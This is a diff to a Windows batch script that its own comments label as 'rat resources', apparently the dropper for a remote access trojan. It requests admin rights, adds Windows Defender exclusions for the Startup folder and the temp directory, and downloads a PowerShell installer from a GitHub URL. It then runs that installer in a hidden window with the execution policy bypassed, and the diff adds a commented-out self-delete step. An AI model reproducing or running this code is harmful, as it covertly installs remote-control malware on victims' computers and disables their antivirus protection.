@@ -3,7 +3,7 @@ REM get admin permissions for script
 
 REM :: BatchgotAdmin
 REM :____________________________________
-#get check #for permissions permissions
+REM #get check #for permissions permissions
     if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) else (
@@ -32,5 +32,8 @@ if '%errorlevel%' NEQ '0' (
 REM disable defender
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-installer.ps1 -Outfile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; -ep bypass ./installer.ps1
+powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-installer.ps1 -Outfile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start_Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe -windowstyle hidden -ep bypass "./installer.ps1"
 
+REM delete self
+REM del getfile.cmd
